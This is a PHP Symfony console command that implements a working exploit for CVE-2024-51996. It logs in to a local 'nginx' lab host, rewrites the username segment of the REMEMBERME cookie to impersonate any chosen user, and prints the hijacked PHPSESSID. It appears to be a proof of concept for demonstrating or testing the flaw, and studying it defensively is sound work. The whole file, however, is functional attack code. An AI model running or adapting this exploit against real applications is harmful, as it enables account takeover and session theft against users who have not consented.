<?php

namespace App\Command;

use Symfony\Component\BrowserKit\HttpBrowser;
use Symfony\Component\Console\Attribute\AsCommand;
use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputArgument;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Component\Console\Style\SymfonyStyle;
use Symfony\Contracts\HttpClient\HttpClientInterface;

#[AsCommand(name: 'exploit:CVE-2024-51996')]
class ExploitCVE202451996Command extends Command
{
    private const string COOKIE_DELIMITER = ':';
    private const string COOKIE_NAME = 'REMEMBERME';

    public function __construct(private readonly HttpClientInterface $httpClient)
    {
        parent::__construct();
    }

    protected function configure()
    {
        $this->addArgument('target_user', InputArgument::REQUIRED, 'Username targeted.');
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $io = new SymfonyStyle($input, $output);

        if (!$input->hasArgument('target_user')) {
            $io->error('Target username is mandatory.');

            return Command::FAILURE;
        }

        $userTarget = $input->getArgument('target_user');

        if (!\is_string($userTarget)) {
            $io->error('Invalid provided target username.');

            return Command::FAILURE;
        }

        $client = new HttpBrowser($this->httpClient);
        $client->request('GET', 'http://nginx/login');

        $client->submitForm('Log in', [
            '_username' => 'user',
            '_password' => 'user',
            '_remember_me' => 'on',
        ]);

        $cookieJar = $client->getCookieJar();
        $rememberMeCookie = $cookieJar->get(self::COOKIE_NAME)?->getValue();

        if (!\is_string($rememberMeCookie)) {
            $io->error('Unable to retrieve the remember me cookie.');

            return Command::FAILURE;
        }

        $cookieInfo = explode(self::COOKIE_DELIMITER, $rememberMeCookie);
        $cookieInfo[1] = str_replace('=', '~', base64_encode($userTarget));
        $alteredCookie = implode(self::COOKIE_DELIMITER, $cookieInfo);

        $response = $this->httpClient->request('GET', 'http://nginx/who-am-i', [
            'headers' => [
                'Cookie' => \sprintf('%s=%s', self::COOKIE_NAME, $alteredCookie),
            ],
        ]);

        $output->writeln(\sprintf('<info>Stolen PHPSESSID : %s</info>', explode(';', $response->getHeaders()['set-cookie'][0])[0]));

        return Command::SUCCESS;
    }
}
